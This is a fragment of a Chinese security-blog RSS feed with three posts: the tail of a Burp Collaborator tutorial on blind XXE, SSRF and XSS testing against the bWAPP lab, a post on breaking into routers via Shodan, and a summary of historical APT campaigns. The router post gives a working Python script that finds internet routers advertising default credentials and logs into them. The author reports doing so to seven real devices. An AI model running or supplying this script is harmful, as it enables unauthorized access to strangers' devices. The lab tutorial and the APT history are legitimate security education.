<p>上图画绿线的就是 collaborator 提供的 payload url，我们在原始的内容上加入了 entity 实体变量 test，值为 payload url，这时 go 发送后，collaborator 捕获的交互信息如下。</p>
<p><img alt="请输入图片描述" class="has" src="https://blog-1251816098.cos.ap-beijing.myqcloud.com/2019040708.png"></p>
<p>上图是 request 的内容，host 的是我们的 payload url，请求后，我们再切换到 response 栏查看，内容如下图。</p>
<p><img alt="请输入图片描述" class="has" src="https://blog-1251816098.cos.ap-beijing.myqcloud.com/2019040709.png"></p>
<p>payload url 请求会返回一串随机内容，我们可以看到已经成功的进行了响应，说明目标服务器进行了外部的请求和交互，那么对于盲 xxe 来说，我们可以证明存在此问题。</p>
<h2><strong>0x05：盲 SSRF 测试</strong></h2>
<p>SSRF 在加载外部文件时，若没有进行严格过滤，则可导致任意文件加载，若加载文件而不反悔文件的内容，也不反悔任何详细的信息，那么对于这种盲 SSRF，我们也可以用 collaborator 进行测试，只要加载的请求替换成我们的 payload url 即可。这里还以 bwapp 的 SSRF 为例，bwapp 的 SSRF 也是有回显信息的，我们还把它当成没有任何提示的盲来进行演示。</p>
<p>首先还是先来看下原始的请求数据包，内容如下图。</p>
<p><img alt="请输入图片描述" class="has" src="https://blog-1251816098.cos.ap-beijing.myqcloud.com/2019040711.png"></p>
<p>对于 url 中的 language 字段引用的文件名称，可以随意进行替换，也算作是文件包含问题，我们把他换成 payload url 后进行提交，此时 collaborator 会显示出其交互的详细信息，resquest 如下图。</p>
<p><img alt="请输入图片描述" class="has" src="https://blog-1251816098.cos.ap-beijing.myqcloud.com/2019040712.png"></p>
<p>可以看到目标服务器进行了 dns 解析了我们的域名，然后 http 进行了访问，response 信息如下图。</p>
<p><img alt="请输入图片描述" class="has" src="https://blog-1251816098.cos.ap-beijing.myqcloud.com/2019040713.png"></p>
<h2><strong>0x06：盲 XSS 测试</strong></h2>
<p>同样的，我们也可以用 collaborator 来进行盲跨站的测试，使用场景例如盲打 xss，提交表单等，若一个平台的提交表单功能，提交内容插入恶意脚本后，提交后台可能不会立即生效，需要等管理员访问相关的页面才会执行，那么我们无法判断是否存在存储跨站的问题，这时使用 payload url 后，collaborator 会不断的进行轮询，只要管理员进行了访问，collaborator 就会捕捉到然后返回到 burp。</p>
<p>我们这里还以 bwapp 的 stored xss blog 为例，这里的脚本提交后就会在列表中显示并执行，也是有回显的，我们这里还是以盲跨站来测，首先在提交内容处，插入 script 标签，src 为我们的 payload url，如下图。</p>
<p><img alt="请输入图片描述" class="has" src="https://blog-1251816098.cos.ap-beijing.myqcloud.com/2019040714.png"></p>
<p>插入后我们查看元素可以发现，脚本内容已经插入成功，如下图。</p>
<p><img alt="请输入图片描述" class="has" src="https://blog-1251816098.cos.ap-beijing.myqcloud.com/2019040715.png"></p>
<p>因为插入的时候就会执行一次，而我们浏览页面的时候又执行了一次，所以 collaborator 会又两条记录信息，这里我们当成盲 xss 来测，如果插入没有执行，而当管理员访问页面后 payload 执行了。collaborator 捕捉的交互信息如下，request 内容。</p>
<p><img alt="请输入图片描述" class="has" src="https://blog-1251816098.cos.ap-beijing.myqcloud.com/2019040716.png"></p>
<p>response 内容（这里是两条信息，插入执行了一次，访问又执行了一次，而我们测试盲 xss 时，是只有一条，插入无法验证所以没有，管理员访问后执行所以一次，大家不要在意这里的细节，明白其原理和使用即可）。</p>
<p><img alt="请输入图片描述" class="has" src="https://blog-1251816098.cos.ap-beijing.myqcloud.com/2019040717.png"></p>
<p>以上就是 burp 的 collaborator 使用的一些简单的总结，理论上对于盲 sql 注入也应该可以行得通，但是我没有找到合适的例子，本机尝试也有一些错误，所以就不列了，如果碰到盲注的话可以先判断它是数字型还是字符型，随后再通过 and、or 这些关键字结合查询一下来判断，对于 collaborator 的话，官方说明文档说可以使用 sql 去查询 xml 文件，xml 引入外部实体也就是 payload url，然后看交互信息。</p>
<h2><strong>0x07：总结</strong></h2>
<p>对于平时测试中的一些盲问题，例如盲 xss，盲 xxe，盲 ssrf 等，如果不能看到一些回显信息，无法判断是否存在漏洞时，可以使用 burp 的 collaborator 来进行尝试。</p>
<p><strong>欢迎关注公众号&lt;发哥微课堂&gt;（右），不定期发表干活内容，共同学习，共同进步。</strong></p>
<p><strong>欢迎添加个人微信（左），可以一块交流讨论，朋友圈不定期发表相关知识内容。</strong></p>
<p>&nbsp;<img alt="" class="has" height="185" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20181123223821928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZhZ2V3ZWlrZXRhbmc=,size_16,color_FFFFFF,t_70" width="185"><strong>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</strong><img alt="" class="has" height="183" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20181123224026892.png" width="184"></p>
</p></div>
</div>
]]></content:encoded>
										</item>
		<item>
		<title>教你如何五分钟内使用 shodan 黑进路由器</title>
		<link>https://uzzz.org/article/2980.html</link>
				<pubDate>Sat, 30 Dec 2017 05:04:12 +0000</pubDate>
		<dc:creator><![CDATA[fandyvon]]></dc:creator>
				<category><![CDATA[渗透测试]]></category>
		<category><![CDATA[web]]></category>
		<category><![CDATA[路由器]]></category>

		<guid isPermaLink="false">https://uzzz.org/article/2980.html</guid>
				<description><![CDATA[最近又重新用了把 shodan 这个神器，shodan 这个网站提供了全网所有设备开放端口的各种信息，这也就给我们的攻击带来了遍历。如果某个软件存在漏洞，而这个软件是类似于 web 服务那种会监听某个端口提供服务的，那么我们就可以利用 shodan 的搜索功能大批量的找到互联网上那些存在漏洞的服务。 就拿弱密码来说吧，我们知道有很多路由器的 web 管理界面的默认密码人们是不会修改的，而一些路由器的 web 页面甚至暴露在了公网上。更加搞笑的是，有些品牌的路由器甚至把自己的默认密码写在了 http 响应的 header 中。 HTTP/1.0 401 Unauthorized Date: Sat, 30 Dec 2017 03:44:21 GMT Server: Boa/0.94.14rc21 Accept-Ranges: bytes Connection: Keep-Alive Keep-Alive: timeout=10, max=1000 WWW-Authenticate: Basic realm=" Default Name:admin Password:1234 " Content-Type: text/html 就比如上面这个，直接告诉你我是 basic 认证，默认的用户名和密码是 admin 和1234。可能有的安全意识较强的用户会修改掉默认用户名和密码，但是仍然有很多人是不会去改的。 研究了一发 shodan 的搜索语法，只要在搜索框内输入default name:admin password， 就可以列出所有这种类型的路由器了，接着就可以一个个去尝试了，基本尝试四五个就能发现一个能登陆进去的。如果嫌一个个尝试太过麻烦，还可以写一个 python 脚本，调用 shodan 的 API 来自动化测试。 import shodan import requests SHODAN_API_KEY = "your api key" api = shodan.Shodan(SHODAN_API_KEY) vul_ip_ports = [] try: # Search Shodan results = api.search('default name:admin password:1234') # Show the results print 'Results found: %s' % results['total'] for result in results['matches']: print 'IP: %s' % result['ip_str'] ip = result['ip_str'] port = result['port'] url = "http://%s:%d/index1.asp" % (ip, port) try: r = requests.get(url, auth=('admin', '1234')) except: continue if r.status_code == 200: print("login into web server success!") vul_ip_ports.append((ip, port)) except shodan.APIError, e: print 'Error: %s' % e ip_ports = [ "%s:%d" % (x[0], x[1]) for x in vul_ip_ports ] print("vul_ips:%s" % ', '.join(ip_ports)) 跑了一遍脚本，由于 shodan api 的限制，默认只返回几十条左右（如果需要更多可能要付费），但也跑出了7个 ip 地址存在该漏洞。希望这些路由器的主人能尽快更改掉自己的默认密码吧。]]></description>
								<content:encoded><![CDATA[<div id="article_content" class="article_content clearfix">
 <!--一个博主专栏付费入口--><br />
 <!--一个博主专栏付费入口结束-->
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-d284373521.css">
<div id="content_views" class="markdown_views prism-atom-one-dark">
  <!-- flowchart 箭头图标 勿删 --><br />
  <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
   <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
  </svg> </p>
<p>最近又重新用了把 shodan 这个神器，shodan 这个网站提供了全网所有设备开放端口的各种信息，这也就给我们的攻击带来了遍历。如果某个软件存在漏洞，而这个软件是类似于 web 服务那种会监听某个端口提供服务的，那么我们就可以利用 shodan 的搜索功能大批量的找到互联网上那些存在漏洞的服务。</p>
<p>就拿弱密码来说吧，我们知道有很多路由器的 web 管理界面的默认密码人们是不会修改的，而一些路由器的 web 页面甚至暴露在了公网上。更加搞笑的是，有些品牌的路由器甚至把自己的默认密码写在了 http 响应的 header 中。</p>
<pre class="prettyprint"><code class=" hljs http"><span class="hljs-status">HTTP/1.0 <span class="hljs-number">401</span> Unauthorized</span>
<span class="hljs-attribute">Date</span>: <span class="hljs-string">Sat, 30 Dec 2017 03:44:21 GMT</span>
<span class="hljs-attribute">Server</span>: <span class="hljs-string">Boa/0.94.14rc21</span>
<span class="hljs-attribute">Accept-Ranges</span>: <span class="hljs-string">bytes</span>
<span class="hljs-attribute">Connection</span>: <span class="hljs-string">Keep-Alive</span>
<span class="hljs-attribute">Keep-Alive</span>: <span class="hljs-string">timeout=10, max=1000</span>
<span class="hljs-attribute">WWW-Authenticate</span>: <span class="hljs-string">Basic realm=" Default Name:admin Password:1234 "</span>
<span class="hljs-attribute">Content-Type</span>: <span class="hljs-string">text/html</span></code></pre>
<p>就比如上面这个，直接告诉你我是 basic 认证，默认的用户名和密码是 admin 和1234。可能有的安全意识较强的用户会修改掉默认用户名和密码，但是仍然有很多人是不会去改的。</p>
<p>研究了一发 shodan 的搜索语法，只要在搜索框内输入<code>default name:admin password</code>， 就可以列出所有这种类型的路由器了，接着就可以一个个去尝试了，基本尝试四五个就能发现一个能登陆进去的。如果嫌一个个尝试太过麻烦，还可以写一个 python 脚本，调用 shodan 的 API 来自动化测试。</p>
<pre class="prettyprint"><code class="language-python hljs "><span class="hljs-keyword">import</span> shodan
<span class="hljs-keyword">import</span> requests

SHODAN_API_KEY = <span class="hljs-string">"your api key"</span>

api = shodan.Shodan(SHODAN_API_KEY)

vul_ip_ports = []
<span class="hljs-keyword">try</span>:

        <span class="hljs-comment"># Search Shodan</span>
        results = api.search(<span class="hljs-string">'default name:admin password:1234'</span>)

        <span class="hljs-comment"># Show the results</span>
        <span class="hljs-keyword">print</span> <span class="hljs-string">'Results found: %s'</span> % results[<span class="hljs-string">'total'</span>]
        <span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> results[<span class="hljs-string">'matches'</span>]:
                <span class="hljs-keyword">print</span> <span class="hljs-string">'IP: %s'</span> % result[<span class="hljs-string">'ip_str'</span>]
                ip = result[<span class="hljs-string">'ip_str'</span>]
                port = result[<span class="hljs-string">'port'</span>]

                url = <span class="hljs-string">"http://%s:%d/index1.asp"</span> % (ip, port)
                <span class="hljs-keyword">try</span>:
                    r = requests.get(url, auth=(<span class="hljs-string">'admin'</span>, <span class="hljs-string">'1234'</span>))
                <span class="hljs-keyword">except</span>:
                    <span class="hljs-keyword">continue</span>
                <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:
                    print(<span class="hljs-string">"login into web server success!"</span>)
                    vul_ip_ports.append((ip, port))

<span class="hljs-keyword">except</span> shodan.APIError, e:
        <span class="hljs-keyword">print</span> <span class="hljs-string">'Error: %s'</span> % e

ip_ports = [ <span class="hljs-string">"%s:%d"</span> % (x[<span class="hljs-number">0</span>], x[<span class="hljs-number">1</span>]) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> vul_ip_ports ]
print(<span class="hljs-string">"vul_ips:%s"</span> % <span class="hljs-string">', '</span>.join(ip_ports))</code></pre>
<p>跑了一遍脚本，由于 shodan api 的限制，默认只返回几十条左右（如果需要更多可能要付费），但也跑出了7个 ip 地址存在该漏洞。希望这些路由器的主人能尽快更改掉自己的默认密码吧。</p>
</p></div>
<link href="https://csdnimg.cn/release/phoenix/mdeditor/markdown_views-526ced5128.css" rel="stylesheet">
</div>
]]></content:encoded>
										</item>
		<item>
		<title>近5年典型的的APT攻击事件</title>
		<link>https://uzzz.org/article/3137.html</link>
				<pubDate>Mon, 07 Aug 2017 16:42:18 +0000</pubDate>
		<dc:creator><![CDATA[fandyvon]]></dc:creator>
				<category><![CDATA[渗透测试]]></category>

		<guid isPermaLink="false">https://uzzz.org/article/3137.html</guid>
				<description><![CDATA[APT攻击 APT攻击是近几年来出现的一种高级攻击，具有难检测、持续时间长和攻击目标明确等特征。 本文中，整理了近年来比较典型的几个APT攻击，并其攻击过程做了分析 （为了加深自己对APT攻击的理解和学习） Google极光攻击 2010年的Google Aurora(极光)攻击是一个十分著名的APT攻击。Google的一名雇员点击即时消息中的一条恶意链接，引发了一系列事件导致这个搜索引擎巨人的网络被渗入数月，并且造成各种系统的数据被窃取。这次攻击以Google和其它大约20家公司为目标，它是由一个有组织的网络犯罪团体精心策划的，目的是长时间地渗入这些企业的网络并窃取数据。 原理图如下： 该攻击过程大致如下： 1) 对Google的APT行动开始于刺探工作，特定的Google员工成为攻击者的目标。攻击者尽可能地收集信息，搜集该员工在Facebook、Twitter、LinkedIn和其它社交网站上发布的信息。 2) 接着攻击者利用一个动态DNS供应商来建立一个托管伪造照片网站的Web服务器。该Google员工收到来自信任的人发来的网络链接并且点击它，就进入了恶意网站。该恶意网站页面载入含有shellcode的JavaScript程序码造成IE浏览器溢出，进而执行FTP下载程序，并从远端进一步抓了更多新的程序来执行(由于其中部分程序的编译环境路径名称带有Aurora字样，该攻击故此得名)。 3) 接下来，攻击者通过SSL安全隧道与受害人机器建立了连接，持续监听并最终获得了该雇员访问Google服务器的帐号密码等信息。 4) 最后，攻击者就使用该雇员的凭证成功渗透进入Google的邮件服务器，进而不断的获取特定Gmail账户的邮件内容信息。&#160; 超级工厂病毒攻击(震网攻击) 著名的超级工厂病毒攻击为人所知主要源于2010年伊朗布什尔核电站遭到Stuxnet蠕虫的攻击的事件曝光。 遭遇超级工厂病毒攻击的核电站计算机系统实际上是与外界物理隔离的，理论上不会遭遇外界攻击。坚固的堡垒只有从内部才能被攻破，超级工厂病毒也正充分的利用了这一点。超级工厂病毒的攻击者并没有广泛的去传播病毒，而是针对核电站相关工作人员的家用电脑、个人电脑等能够接触到互联网的计算机发起感染攻击，以此为第一道攻击跳板，进一步感染相关人员的移动设备，病毒以移动设备为桥梁进入“堡垒”内部，随即潜伏下来。病毒很有耐心的逐步扩散，一点一点的进行破坏。这是一次十分成功的APT攻击，而其最为恐怖的地方就在于极为巧妙的控制了攻击范围，攻击十分精准。 在2011年，一种基于Stuxnet代码的新型的蠕虫Duqu又出现在欧洲，号称“震网二代”。 Duqu主要收集工业控制系统的情报数据和资产信息，为攻击者提供下一步攻击的必要信息。攻击者通过僵尸网络对其内置的RAT进行远程控制，并且采用私有协议与CC端进行通讯，传出的数据被包装成jpg文件和加密文件。&#160; 夜龙攻击 夜龙攻击是McAfee在2011年2月份发现并命名的针对全球主要能源公司的攻击行为。 该攻击的攻击过程是： 1) 外网主机如Web服务器遭攻击成功，多半是被SQL注入攻击; 2) 被黑的Web服务器被作为跳板，对内网的其他服务器或PC进行扫描; 3) 内网机器如AD服务器或开发人员电脑遭攻击成功，多半是被密码暴力破解; 4) 被黑机器被植入恶意代码，多半被安装远端控制工具(RAT)，传回大量机敏文件(WORD、PPT、PDF等等)，包括所有会议记录与组织人事架构图; 5) 更多内网机器遭入侵成功，多半为高阶主管点击了看似正常的邮件附件，却不知其中含有恶意代码。 &#160; RSA SecurID窃取攻击 2011年3月，EMC公司下属的RSA公司遭受入侵，部分SecurID技术及客户资料被窃取。其后果导致很多使用SecurID作为认证凭据建立VPN网络的公司——包括洛克希德马丁公司、诺斯罗普公司等美国国防外包商——受到攻击，重要资料被窃取。在RSA SecurID攻击事件中，攻击方没有使用大规模SQL注入，也没有使用网站挂马或钓鱼网站，而是以最原始的网路通讯方式，直接寄送电子邮件给特定人士，并附带防毒软体无法识别的恶意文件附件。 其攻击过程大体如下： 1) RSA有两组同仁们在两天之中分别收到标题为“2011 Recruitment Plan”的恶意邮件，附件是名为“2011 Recruitment plan.xls”的电子表格; 2) 很不幸，其中一位同仁对此邮件感到兴趣，并将其从垃圾邮件中取出来阅读，殊不知此电子表格其实含有当时最新的Adobe Flash的0day漏洞(CVE-2011-0609); 3) 该主机被植入臭名昭著的Poison Ivy远端控制工具，并开始自C&#38;C中继站下载指令进行任务; 4) 首批受害的使用者并非“位高权重”人物，紧接着相关联的人士包括IT与非IT等服务器管理员相继被黑; 5) RSA发现开发用服务器(Staging server)遭入侵，攻击方随即进行撤离，加密并压缩所有资料(都是rar格式)，并以FTP传送至远端主机，又迅速再次搬离该主机，清除任何踪迹。 暗鼠攻击 2011年8月份，McAfee/Symantec发现并报告了该攻击。该攻击在长达数年的持续攻击过程中，渗透并攻击了全球多达70个公司和组织的网络，包括美国政府、联合国、红十字会、武器制造商、能源公司、金融公司，等等。 其攻击过程如下： 1) 攻击者通过社会工程学的方法收集被攻击目标的信息。 2) 攻击者给目标公司的某个特定人发送一些极具诱惑性的、带有附件的邮件例如邀请他参见某个他所在行业的会议，以他同事或者HR部门的名义告知他更新通讯录，请他审阅某个真实存在的项目的预算，等等。 3) 当受害人打开这些邮件，查看附件(大部分形如：Participant_Contacts.xls、2011 project budget.xls、Contact List -Update.xls、The budget justification.xls)，受害人的EXCEL程序的FEATHEADER远程代码执行漏洞(Bloodhound.Exploit.306)被利用，从而被植入木马。实际上，该漏洞不是0day漏洞，但是受害人没有及时打补丁，并且，该漏洞只针对某些版本的EXCEL有效，可见被害人所使用的EXCEL版本信息也已经为攻击者所悉知。 4) 木马开始跟远程的服务器进行连接，并下载恶意代码。而这些恶意代码被精心伪装(例如被伪装为图片，或者HTML文件)，不为安全设备所识别。 5) 借助恶意代码，受害人机器与远程计算机建立了远程Shell连接，从而导致攻击者可以任意控制受害人的机器。 &#160; Lurid攻击 2011年9月22日，TrendMicro的研究人员公布了一起针对前独联体国家、印度、越南和中国等国家的政府部门、外交部门、航天部门，还有科研机构APT攻击——Lurid攻击。 攻击者的主要是利用了CVE-2009-4324和 CVE-2010-2883这两个已知的Adobe Reader漏洞，以及被压缩成RAR文件的带有恶意代码的屏幕保护程序。 用户一旦阅读了恶意PDF文件或者打开了恶意屏幕保护程序，就会被植入木马。木马程序会变换多种花样驻留在受害人电脑中，并与C&#38;C服务器进行通讯，收集的信息通常通过HTTP POST上传给C&#38;C服务器。攻击者借助C&#38;C服务器对木马下达各种指令，不断收集受害企业的敏感信息。 &#160; Nitro攻击 2011年10月底，Symantec发布的一份报告公开了主要针对全球化工企业的进行信息窃取的Nitro攻击。 该攻击的过程也十分典型： 1) 受害企业的部分雇员收到带有欺骗性的邮件; 2) 当受害人阅读邮件的时候，往往会看到一个通过文件名和图标伪装成一个类似文本文件的附件，而实际上是一个可执行程序;或者看到一个有密码保护的压缩文件附件，密码在邮件中注明，并且如果解压会产生一个可执行程序。 3) 只要受害人执行了附件中的可执行程序，就会被植入Poison Ivy后门程序。 4) Poison Ivy会通过TCP 80端口与C&#38;C服务器进行加密通讯，将受害人的电脑上的信息上传，主要是帐号相关的文件信息。 5) 攻击者在获取了加密的帐号信息后通过解密工具找到帐号的密码，然后借助事先植入的木马在受害企业的网络寻找目标、伺机行动、不断收集企业的敏感信息。 6) 所有的敏感信息会加密存储在网络中的一台临时服务器上，并最终上传到公司外部的某个服务器上，从而完成攻击。 &#160; Luckycat攻击 2012年3月份，TrendMicro发布的报告中披露了一个针对印度和日本的航空航天、军队、能源等单位进行长时间的渗透和刺探的攻击行动，并命名为Luckycat。 根据报告显示，这次攻击行动依然是通过钓鱼邮件开始的，例如针对日本目标的钓鱼邮件的内容大都跟福岛核电站的核辐射问题有关。然后就是利用了很多针对 pdf/rtf的漏洞，包括CVE-2010-3333，CVE-2010-2883，CVE-2010-3654，CVE- 2011-0611，CVE-2011-2462等。渗透进去之后就是用C&#38;C进行远程控制。而C&#38;C服务器是通过VPS申请到的DNS域名。 全球最危险的十大APT攻击事件 一、 丰收行动 2016年7月，东巽科技2046Lab捕获到一例疑似木马的样本，该木马样本伪装成Word文档，实为包含CVE-2015-1641（Word类型混淆漏洞）漏洞利用的RTF格式文档，以邮件附件的形式发给攻击目标，发动鱼叉式攻击。将文件提交到多引擎杀毒平台，发现54款杀毒软件仅8款可以检出威胁，说明攻击者对木马做了大量的免杀处理。随后，2046Lab研究人员对样本进行了深入的人工分析，发现其C&#38;C服务器依然存活，于是对其进行了跟踪溯源和样本同源分析，又发现了其他两处C&#38;C服务器和更多样本。 从溯源和关联分析来看，种种迹象表明，该样本源于南亚某国隐匿组织的APT攻击，目标以巴基斯坦、中国等国家的科研院所、军事院校和外交官员为主，通过窃取文件的方式获取与军事相关情报。由于样本的通信密码含有“January14”关键词，这一天正好是南亚某国盛行的“丰收节”，故把该APT事件命名为“丰收行动”。 二、 摩诃草事件 摩诃草组织（APT-C-09），又称 HangOver、VICEROY TIGER、The Dropping Elephant、Patchwork，是一个来自于南亚地区的境外 APT 组织，该组织已持续活跃了 7 年。摩诃草组织最早由 Norman 安全公司于 2013 年曝光，随后又有其他安全厂商持续追踪并披露该组织的最新活动，但该组织并未由于相关攻击行动曝光而停止对相关目标的攻击，相反从 2015年开始更加活跃。摩诃草组织主要针对中国、巴基斯坦等亚洲地区国家进行网络间谍活动，其中以窃取敏感信息为主。相关攻击活动最早可以追溯到 2009 年 11 月，至今还非常活跃。在针对中国地区的攻击中，该组织主要针对政府机构、科研教育领域进行攻击，其中以科研教育领域为主。 本次攻击行动也安全厂商被称为“Patchwork”或“The Dropping Elephant”，从 2015 年初开始持续至今的攻击，其中从 2015 年 8 月开始至 2016 年 6 月攻击 非常频繁。本次行动的攻击目标主要是中国地区，期间使用了大量文档型漏洞，以 CVE-2014-4114 使用最多。我们主要通过本次攻击行动中 C&#38;C 的 SOA 关联到第一次攻击行动 中相关 C&#38;C 历史域名注册人，由于 SOA 本身可以被 DNS 管理者修改，所以存在被刻意修改 的可能性，但从我们的分析推断来看这种可能性很低，另外结合相关行动意图和幕后组织的 发起方，我们更倾向本次攻击行动属于摩诃草组织的最新一次攻击行动。在本报告后续章节 的研究分析，会将本次攻击行动作为摩诃草组织的第四次攻击行动进行描述。 三、 蔓灵花行动 美国网络安全公司Forcepoint 近期发布了一篇报告，该报告主要披露了巴基斯坦政府官员最近遭到了来源不明的网络间谍活动。该报告描述了攻击者使用了鱼叉邮件以及利用系统漏洞等方式，在受害者计算机中植入了定制的AndroRAT，意图窃取敏感信息和资料。Forcepoint研究人员认为该组织与BITTER相关，而且可能还不止发起了这一起攻击事件。BITTER攻击始于2013年11月，且多年来一直未被检测到，目前攻击者背景尚未明确。相关APP信息包括提供关于印度和巴基斯坦之间的争议地区新闻的Kashmir News等。 从恶意样本的时间戳来看，国外样本最早出现在2013年11月，样本编译时间集中出现在2015年7月至2016年9月期间。 国内感染用户的样本的编译时间集中在2016年5月到9月期间，其网络活动的活跃时间集中在9月份，其CC至今依然存活。 主要受影响单位：中国某国家部委、中国某工业集团、中国某电力单位。 四、 MONSOON事件 2016年8月，Forcepoint 发布了一个APT攻击的追踪报告。该报告由Forcepoint安全实验室特别调查小组长期独立追踪完成。该调查小组隶属于Forcepoint安全实验室，由优秀的恶意软件逆向工程师和分析师组成，其职责是专门深入研究僵尸网络和APT攻击。他们与全球众多值得信赖的机构协作，以提供切实可见的决策为宗旨，向大众、客户以及合作伙伴等利益相关者传递相关信息，针对网络安全问题，警醒全球用户。此次APT事件来自印度的针对中国和南亚国家。 六、白俄罗斯军事通讯社事件 最近，互联网上出现一起针对白俄罗斯军事网站的渗透活动，攻击者通过电子邮件做为诱饵，在电子邮件的附件中嵌入漏洞利用的文档，在受害者打开文档后，文档中嵌入的shellcode得以执行，实现对目标系统的控制。在受害者重启计算机后，通过操作系统的启动项加载PE文件，进行后续的渗透攻击。从我们最初得到的email来看，攻击者针对是白俄罗斯共和国国防部武装部队军事通讯社进行的定向攻击。 攻击者第一步是向白俄罗斯共和国国防部武装部队军事通讯社发送邮件。邮件主题“Куда]]></description>
								<content:encoded><![CDATA[<div id="article_content" class="article_content clearfix">
 <!--一个博主专栏付费入口--><br />
 <!--一个博主专栏付费入口结束-->
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-d284373521.css">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-d284373521.css">
<div class="htmledit_views" id="content_views">
<div class="topic-bread">
<h2>APT攻击<br /></h2>
<p><span style="color:#FF0000;">APT</span>攻击是近几年来出现的一种高级攻击，具有难检测、持续时间长和攻击目标明确等特征。</p>
<p>本文中，整理了近年来比较典型的几个<span style="color:#FF0000;">APT</span>攻击，并其攻击过程做了分析</p>
<p>（为了加深自己对APT攻击的理解和学习<img alt="大笑" src="http://static.blog.csdn.net/xheditor/xheditor_emot/default/laugh.gif"><img alt="奋斗" src="http://static.blog.csdn.net/xheditor/xheditor_emot/default/struggle.gif"><img alt="微笑" src="http://static.blog.csdn.net/xheditor/xheditor_emot/default/smile.gif"><img alt="奋斗" src="http://static.blog.csdn.net/xheditor/xheditor_emot/default/struggle.gif">）</p>
<h3><a href="http://blog.csdn.net/youkawa/article/details/42041815" rel="nofollow" data-token="42961814a904e804cb960db2a6d6129a"><strong>Google极光攻击</strong></a></h3>
<p>2010年的<span style="color:#CC0000;">Google Aurora</span>(极光)攻击是一个十分著名的APT攻击。Google的一名雇员点击即时消息中的一条恶意链接，引发了一系列事件导致这个搜索引擎巨人的网络被渗入数月，并且造成各种系统的数据被窃取。这次攻击以Google和其它大约20家公司为目标，它是由一个有组织的网络犯罪团体精心策划的，目的是长时间地渗入这些企业的网络并窃取数据。</p>
<h4><strong>原理图如下：</strong><br /></h4>
<p><img src="https://uzshare.com/_p?https://img-blog.csdn.net/20170808002034829?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvWm1laVh1YW4=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""></p>
<p style="text-align:center;"></p>
<h4>该攻击过程大致如下：</h4>
<p>1) 对Google的APT行动开始于刺探工作，特定的Google员工成为攻击者的目标。攻击者尽可能地收集信息，搜集该员工在Facebook、Twitter、LinkedIn和其它社交网站上发布的信息。</p>
<p>2) 接着攻击者利用一个动态DNS供应商来建立一个托管伪造照片网站的Web服务器。该Google员工收到来自信任的人发来的网络链接并且点击它，就进入了恶意网站。该恶意网站页面载入含有shellcode的JavaScript程序码造成IE浏览器溢出，进而执行FTP下载程序，并从远端进一步抓了更多新的程序来执行(由于其中部分程序的编译环境路径名称带有Aurora字样，该攻击故此得名)。</p>
<p>3) 接下来，攻击者通过<span style="color:#CC0000;">SSL安全隧道</span>与受害人机器建立了连接，持续监听并最终获得了该雇员访问Google服务器的帐号密码等信息。</p>
<p>4) 最后，攻击者就使用该雇员的凭证成功渗透进入Google的邮件服务器，进而不断的获取特定Gmail账户的邮件内容信息。&nbsp;</p>
<h2><a href="http://www.2cto.com/article/201504/395447.html" rel="nofollow" data-token="d124d4b19a1565fe72774c3b0ce76665"><strong>超级工厂病毒攻击(震网攻击)</strong></a></h2>
<p>著名的超级工厂病毒攻击为人所知主要源于2010年伊朗布什尔核电站遭到<span style="color:#FF0000;">Stuxnet</span>蠕虫的攻击的事件曝光。</p>
<p><img src="https://uzshare.com/_p?https://img-blog.csdn.net/20170808002423803?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvWm1laVh1YW4=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""></p>
<p>遭遇超级工厂病毒攻击的核电站计算机系统实际上是与外界物理隔离的，理论上不会遭遇外界攻击。坚固的堡垒只有从内部才能被攻破，超级工厂病毒也正充分的利用了这一点。超级工厂病毒的攻击者并没有广泛的去传播病毒，而是针对核电站相关工作人员的家用电脑、个人电脑等能够接触到互联网的计算机发起感染攻击，以此为第一道攻击跳板，进一步感染相关人员的移动设备，病毒以移动设备为桥梁进入“堡垒”内部，随即潜伏下来。病毒很有耐心的逐步扩散，一点一点的进行破坏。这是一次十分成功的APT攻击，而其最为恐怖的地方就在于极为巧妙的控制了攻击范围，攻击十分精准。</p>
<p>在2011年，一种基于Stuxnet代码的新型的蠕虫<span style="color:#CC0000;">Duqu</span>又出现在欧洲，号称“震网二代”。 Duqu主要收集工业控制系统的情报数据和资产信息，为攻击者提供下一步攻击的必要信息。攻击者通过僵尸网络对其内置的RAT进行远程控制，并且采用私有协议与CC端进行通讯，传出的数据被包装成jpg文件和加密文件。&nbsp;</p>
<p><a href="http://blog.sciencenet.cn/blog-947101-757497.html" rel="nofollow" data-token="c2154f822cd9a5b3012b615f53b74a7f"><strong>夜龙攻击</strong></a></p>
<p>夜龙攻击是McAfee在2011年2月份发现并命名的针对全球主要能源公司的攻击行为。</p>
<p style="text-align:center;"></p>
<h4>该攻击的攻击过程是：</h4>
<p>1) 外网主机如Web服务器遭攻击成功，多半是被SQL注入攻击;</p>
<p>2) 被黑的Web服务器被作为跳板，对内网的其他服务器或PC进行扫描;</p>
<p>3) 内网机器如AD服务器或开发人员电脑遭攻击成功，多半是被密码暴力破解;</p>
<p>4) 被黑机器被植入恶意代码，多半被安装远端控制工具(RAT)，传回大量机敏文件(WORD、PPT、PDF等等)，包括所有会议记录与组织人事架构图;</p>
<p>5) 更多内网机器遭入侵成功，多半为高阶主管点击了看似正常的邮件附件，却不知其中含有恶意代码。</p>
<p>&nbsp;</p>
<h2><strong>RSA SecurID窃取攻击</strong></h2>
